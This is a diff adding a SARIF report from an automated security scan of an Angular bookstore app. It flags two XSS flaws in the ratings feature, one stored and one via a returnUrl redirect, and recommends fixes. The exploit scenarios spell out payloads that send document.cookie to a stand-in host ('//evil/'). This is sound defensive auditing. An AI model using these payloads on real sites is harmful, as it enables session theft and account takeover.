@@ -1,0 +1,249 @@
+{
+  "$schema": "https://docs.oasis-open.org/sarif/sarif/v2.1.0/errata01/os/schemas/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Claude Security Plugin for Claude Code",
+          "organization": "Anthropic",
+          "informationUri": "https://claude.com/product/claude-security",
+          "version": "0.12.0",
+          "rules": [
+            {
+              "id": "CWE-79",
+              "name": "CrossSiteScripting",
+              "shortDescription": {
+                "text": "Cross-site Scripting"
+              },
+              "fullDescription": {
+                "text": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') (CWE-79, CWE 4.20): findings whose CWE is this entry of the Simplified Mapping view or rolls up to it, reported by Claude Security Plugin for Claude Code from static review of the source."
+              },
+              "help": {
+                "text": "Each alert's message names the finding's own CWE and states the impact, exploit scenario, preconditions and recommended fix; the finding appears under its F<n> id in CLAUDE-SECURITY-RESULTS.md."
+              },
+              "helpUri": "https://cwe.mitre.org/data/definitions/79.html",
+              "properties": {
+                "tags": [
+                  "security",
+                  "external/cwe/cwe-79"
+                ]
+              }
+            }
+          ]
+        }
+      },
+      "automationDetails": {
+        "id": "claude-security-plugin/changes/85731200-96ab-407b-96f7-20110698a66a",
+        "guid": "85731200-96ab-407b-96f7-20110698a66a"
+      },
+      "invocations": [
+        {
+          "executionSuccessful": true
+        }
+      ],
+      "originalUriBaseIds": {
+        "%SRCROOT%": {
+          "description": {
+            "text": "The top level of the scanned repository, or the scanned directory when the scan did not run inside a git checkout."
+          }
+        }
+      },
+      "results": [
+        {
+          "ruleId": "CWE-79",
+          "ruleIndex": 0,
+          "level": "warning",
+          "message": {
+            "text": "Stored XSS: buyer-supplied rating comment rendered via innerHTML after bypassSecurityTrustHtml.\n\nThe rating comment comes from any buyer, through the create/update rating forms or straight from the unauthenticated ratings API (POST/PUT /api/v1/ratings, CORS *), and is stored unchanged. It comes back from GET /api/v1/ratings and is marked trusted with bypassSecurityTrustHtml before being bound to [innerHTML], which turns off Angular's built-in HTML sanitizer.\n\nImpact: Persistent script execution in the storefront/admin SPA origin for everyone who views the ratings list. This allows session/cookie theft, actions taken as the victim (deleting books, changing config through the ingest settings screens), and page defacement.\n\nExploit scenario: The attacker sends PUT /api/v1/ratings/1 with body {\"id\":1,\"email\":\"x\",\"isbn\":\"y\",\"rating\":5,\"comment\":\"<img src=x onerror=fetch('//evil/'+document.cookie)>\"}. A POST with any valid email/ISBN, or the Create Rating form, also works. Store staff open /ratings, which the UI says is where comments are read ('Only Quillmark sees your comment'), and the onerror handler runs in the web app's origin. From there it can call every BookStore API as the victim and change the page.\n\nPreconditions: Attacker can submit or change a rating comment (the ratings API needs no authentication); A victim opens the /ratings list view.\n\nRecommendation: Remove the bypassSecurityTrustHtml call. Render the comment with {{ }} interpolation, or bind the plain string to [innerHTML] so Angular's sanitizer runs. If rich formatting is truly needed, sanitize it with a strict allow-list (e.g. DOMPurify) and also validate or encode it on the server.\n\nCWE-79. Severity MEDIUM, confidence high."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "web/src/app/ratings/rating-list/rating-list.component.ts",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 26,
+                  "snippet": {
+                    "text": "    return this.sanitizer.bypassSecurityTrustHtml(rating.comment ?? '');"
+                  }
+                }
+              },
+              "logicalLocations": [
+                {
+                  "name": "RatingListComponent.commentHtml",
+                  "fullyQualifiedName": "RatingListComponent.commentHtml"
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "claudeSecurityPlugin": {
+              "id": "F1",
+              "title": "Stored XSS: buyer-supplied rating comment rendered via innerHTML after bypassSecurityTrustHtml",
+              "impact": "Persistent script execution in the storefront/admin SPA origin for everyone who views the ratings list. This allows session/cookie theft, actions taken as the victim (deleting books, changing config through the ingest settings screens), and page defacement.",
+              "file": "web/src/app/ratings/rating-list/rating-list.component.ts",
+              "line": 26,
+              "description": "The rating comment comes from any buyer, through the create/update rating forms or straight from the unauthenticated ratings API (POST/PUT /api/v1/ratings, CORS *), and is stored unchanged. It comes back from GET /api/v1/ratings and is marked trusted with bypassSecurityTrustHtml before being bound to [innerHTML], which turns off Angular's built-in HTML sanitizer.",
+              "exploit_scenario": "The attacker sends PUT /api/v1/ratings/1 with body {\"id\":1,\"email\":\"x\",\"isbn\":\"y\",\"rating\":5,\"comment\":\"<img src=x onerror=fetch('//evil/'+document.cookie)>\"}. A POST with any valid email/ISBN, or the Create Rating form, also works. Store staff open /ratings, which the UI says is where comments are read ('Only Quillmark sees your comment'), and the onerror handler runs in the web app's origin. From there it can call every BookStore API as the victim and change the page.",
+              "preconditions": [
+                "Attacker can submit or change a rating comment (the ratings API needs no authentication)",
+                "A victim opens the /ratings list view"
+              ],
+              "category": "Cross-site Scripting",
+              "severity": "MEDIUM",
+              "confidence": "high",
+              "recommendation": "Remove the bypassSecurityTrustHtml call. Render the comment with {{ }} interpolation, or bind the plain string to [innerHTML] so Angular's sanitizer runs. If rich formatting is truly needed, sanitize it with a strict allow-list (e.g. DOMPurify) and also validate or encode it on the server.",
+              "cwe_id": "CWE-79",
+              "snippet": "    return this.sanitizer.bypassSecurityTrustHtml(rating.comment ?? '');",
+              "symbol": "RatingListComponent.commentHtml",
+              "declared_line": 26,
+              "via_change": "web/src/app/ratings/rating-list/rating-list.component.html:19 swaps the comment cell's text interpolation for an [innerHTML] binding to commentHtml(rating). That method, added in the same change, wraps the raw comment in bypassSecurityTrustHtml, so stored comment markup now runs as live DOM.",
+              "other_cwe_ids": [],
+              "claudeSecurityPluginFindingId": "v3:5c22a9c9a3b17b5601c480e5d881088d139ab93bc58080ec7c6bd0e09812a6af",
+              "verification": {
+                "panel": {
+                  "true": 3,
+                  "false": 0,
+                  "voters": 3
+                }
+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-79",
+          "ruleIndex": 0,
+          "level": "warning",
+          "message": {
+            "text": "DOM XSS / open redirect: returnUrl query parameter assigned to window.location.href without scheme check.\n\nThe returnUrl query parameter is controlled by whoever crafts the link. After a successful save it is assigned to window.location.href, and nothing restricts it to http(s) or a same-site path, so a javascript: URL runs in the app origin and an absolute URL redirects off-site.\n\nImpact: Script execution in the SPA origin (cookie theft, actions taken as the victim) or an open redirect to an attacker site.\n\nExploit scenario: The attacker sends the victim a link such as https://bookstore/update-rating/1?returnUrl=javascript:fetch('//evil/'+document.cookie). The victim picks a star and submits. The save succeeds, goToRatingsList assigns the javascript: URL to location, and the script runs in the BookStore web origin. With returnUrl=https://evil.example the same code redirects the victim to a phishing page.\n\nPreconditions: Victim opens an attacker-crafted update-rating link; Victim submits the form and the save succeeds.\n\nRecommendation: Accept only same-app relative paths: require a leading '/' that is not followed by '/' or '\\', and navigate with router.navigateByUrl. Otherwise parse with new URL(returnUrl, location.origin) and require url.origin === location.origin and an http(s) protocol before navigating.\n\nCWE-79. Severity MEDIUM, confidence high."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "web/src/app/ratings/update-rating/update-rating.component.ts",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 71,
+                  "snippet": {
+                    "text": "      window.location.href = returnUrl;"
+                  }
+                }
+              },
+              "logicalLocations": [
+                {
+                  "name": "UpdateRatingComponent.goToRatingsList",
+                  "fullyQualifiedName": "UpdateRatingComponent.goToRatingsList"
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "claudeSecurityPlugin": {
+              "id": "F2",
+              "title": "DOM XSS / open redirect: returnUrl query parameter assigned to window.location.href without scheme check",
+              "impact": "Script execution in the SPA origin (cookie theft, actions taken as the victim) or an open redirect to an attacker site.",
+              "file": "web/src/app/ratings/update-rating/update-rating.component.ts",
+              "line": 71,
+              "description": "The returnUrl query parameter is controlled by whoever crafts the link. After a successful save it is assigned to window.location.href, and nothing restricts it to http(s) or a same-site path, so a javascript: URL runs in the app origin and an absolute URL redirects off-site.",
+              "exploit_scenario": "The attacker sends the victim a link such as https://bookstore/update-rating/1?returnUrl=javascript:fetch('//evil/'+document.cookie). The victim picks a star and submits. The save succeeds, goToRatingsList assigns the javascript: URL to location, and the script runs in the BookStore web origin. With returnUrl=https://evil.example the same code redirects the victim to a phishing page.",
+              "preconditions": [
+                "Victim opens an attacker-crafted update-rating link",
+                "Victim submits the form and the save succeeds"
+              ],
+              "category": "Cross-site Scripting",
+              "severity": "MEDIUM",
+              "confidence": "high",
+              "recommendation": "Accept only same-app relative paths: require a leading '/' that is not followed by '/' or '\\', and navigate with router.navigateByUrl. Otherwise parse with new URL(returnUrl, location.origin) and require url.origin === location.origin and an http(s) protocol before navigating.",
+              "cwe_id": "CWE-79",
+              "snippet": "      window.location.href = returnUrl;",
+              "symbol": "UpdateRatingComponent.goToRatingsList",
+              "declared_line": 71,
+              "via_change": "web/src/app/ratings/update-rating/update-rating.component.ts:69-72 adds code that reads returnUrl from the route's query parameters and, when it is present, assigns it straight to window.location.href in place of the router navigation to /ratings.",
+              "other_cwe_ids": [],
+              "claudeSecurityPluginFindingId": "v3:65fcfb6e055f29156ea60fdf3f38ff6c3824976bbcfe406baf522f840892c802",
+              "verification": {
+                "panel": {
+                  "true": 3,
+                  "false": 0,
+                  "voters": 3
+                }
+              }
+            }
+          }
+        }
+      ],
+      "properties": {
+        "claudeSecurityPlugin": {
+          "generated_at": "2026-10-16T15:22:58+00:00",
+          "scan_id": "85731200-96ab-407b-96f7-20110698a66a",
+          "mode": "changes",
+          "scan_prefix": "",
+          "scope": [],
+          "revision": {
+            "versioned": true,
+            "commit": "d5dab21555523d1ef0754aaab543ef4b25d6295c",
+            "branch": "feat/BOOK-2-01-02-storefront-ratings",
+            "dirty": false,
+            "base": "origin/master",
+            "merge_base": "6942a2434ee05dd72c202744c760dc593a0e58c1"
+          },
+          "revision_source": "self-reported",
+          "effort": "high",
+          "run_shape": {
+            "requested_effort": "high",
+            "collapsed": null,
+            "source": "coverage.json",
+            "diff_files": 31,
+            "diff_lines": 3456,
+            "pre_existing": 0,
+            "scope_files": null,
+            "empty_diff": false,
+            "empty_scope": false,
+            "researchers_dispatched": 7,
+            "skipped_components": [],
+            "completeness_check_outcome": "not-applicable",
+            "unaccounted_top_level_dirs": [],
+            "inventory_fallback": null,
+            "top_level_dir_count": null,
+            "target_files": null,
+            "component_cap": 24,
+            "research_coverage": null
+          },
+          "findings": {
+            "total": 2,
+            "critical": 0,
+            "high": 0,
+            "medium": 2,
+            "low": 0
+          },
+          "verification": {
+            "status": "verified",
+            "candidates": 10,
+            "candidates_deduped": 3,
+            "panel_votes": 9,
+            "panel_reviewed_findings": 2,
+            "panel_quorum_findings": 2,
+            "unreviewed_candidate_sites": 0,
+            "incomplete_panel_candidates": 0,
+            "attested_findings": 0,
+            "reason": null,
+            "researchers_dispatched": 7,
+            "researchers_returned": 7
+          },
+          "target_kind": "git-remote"
+        }
+      },
+      "versionControlProvenance": [
+        {
+          "repositoryUri": "https://github-ig.com/ihudak/bookstore",
+          "revisionId": "d5dab21555523d1ef0754aaab543ef4b25d6295c"
+        }
+      ]
+    }
+  ]
+}
